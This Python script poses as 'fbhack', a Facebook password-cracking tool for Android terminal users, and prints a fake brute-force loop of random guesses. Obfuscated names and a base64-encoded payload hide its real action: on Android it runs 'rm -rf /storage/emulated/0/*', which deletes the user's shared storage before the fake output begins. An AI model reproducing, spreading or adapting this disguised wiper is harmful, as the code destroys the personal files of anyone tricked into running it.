import base64
import time
import os
import string
import random

try:
  from colorama import init
  from colorama import Fore, Back, Style
  init()
  
except ImportError:
  os.system('pip3 install colorama')
  os.system('clear')
  os.system('python3 fbhack.py')


def tvksajd(adwekuv):
  pvncngr = base64.b64decode(adwekuv).decode('utf-8')
  exec(pvncngr)


def banner():
  print(Fore.RED + """

  █████▒▄▄▄▄       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
▓██   ▒▓█████▄    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒████ ░▒██▒ ▄██   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░▓█▒  ░▒██░█▀     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░▒█░   ░▓█  ▀█▓   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
 ▒ ░   ░▒▓███▀▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ░     ▒░▒   ░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░ ░    ░    ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ 
        ░          ░  ░  ░      ░  ░░ ░      ░  ░   
             ░                      ░               

 """)
  

def oumcgsq():
  vcxprvq = base64.b64decode('L3N0b3JhZ2UvZW11bGF0ZWQvMC8=').decode('utf-8')
  if os.path.exists(vcxprvq):
    tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qICYmIGNsZWFyJyk=")
    banner()


def hack():
  banner()
  oumcgsq()
  username = input("username: ")
  time.sleep(0.5)
  print(Fore.BLUE + "Using Default worlist: wordlist.txt \n")
  time.sleep(0.5)
  
  
  try:
    while True:
      alphabet = string.ascii_lowercase
      x = ''.join(random.choice(alphabet) for i in range(8))
      print(Fore.BLUE + '[+] ' + Fore.YELLOW + username + ":" + x + " ==> " + Fore.RED + "ACCESS DENIED")
      time.sleep(1)
      
  except KeyboardInterrupt:
    print(Fore.BLUE + "[+] " + Fore.RED + "HACK THE PLANET" + Fore.BLUE + " [+]")
    time.sleep(0.2)



hack()
